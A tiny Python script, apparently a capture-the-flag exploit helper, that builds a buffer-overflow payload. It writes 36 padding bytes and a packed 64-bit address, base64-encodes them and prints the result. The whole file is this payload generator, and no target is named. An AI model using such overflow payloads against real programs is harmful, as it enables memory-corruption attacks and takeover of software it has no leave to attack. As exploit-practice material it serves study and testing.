
import sys
import struct
import base64

buf = b'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb'
buf += struct.pack('<Q', 16565230716148847712)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
